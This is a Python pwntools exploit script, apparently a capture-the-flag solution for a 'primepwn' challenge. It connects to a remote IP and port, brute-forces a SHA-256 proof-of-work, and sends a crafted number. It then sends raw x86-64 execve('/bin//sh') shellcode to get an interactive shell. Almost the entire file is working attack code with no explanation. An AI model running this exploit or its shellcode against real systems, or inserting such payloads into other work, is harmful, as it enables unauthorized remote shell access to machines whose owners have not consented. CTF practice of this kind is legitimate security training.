#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
from time import sleep
from itertools import product
from hashlib import sha256

# Settings
context.terminal = ['tmux', 'splitw', '-h']

# Global
EXEC = 0x0000555555554000

io = remote("47.89.18.224", 10008)
#io = process("./chall", env = {"LD_PRELOAD" : "./libc-2.23.so"})

chs = string.ascii_letters+string.digits
def proof():
    global io, chs
    io.recvuntil('xxxx+')
    s = io.recv(16)
    io.recvuntil('== ')
    d = io.recv(64)
    print s, d
    for i in product(chs, repeat=4):
        if sha256(''.join(i)+s).hexdigest() == d:
            print bytearray(i)
            res = ''.join(i)
            break
    io.sendlineafter('xxxx:', res)


# gdb
#io = process("./primepwn")
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (addr))

#attach(0x400A3F)

proof()

code = """
s:
    syscall;
    mov esi, ecx
"""

#prime = asm('syscall')
#prime += asm('mov esi, ecx')
#prime += asm('mov dh, 0x%02x' % 1)
#prime += asm('syscall')


shellcode = asm("mov esp, 0x601800")
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
io.sendline(str(17936502194338071823))
sleep(10)
io.sendline(shellcode)
io.interactive()

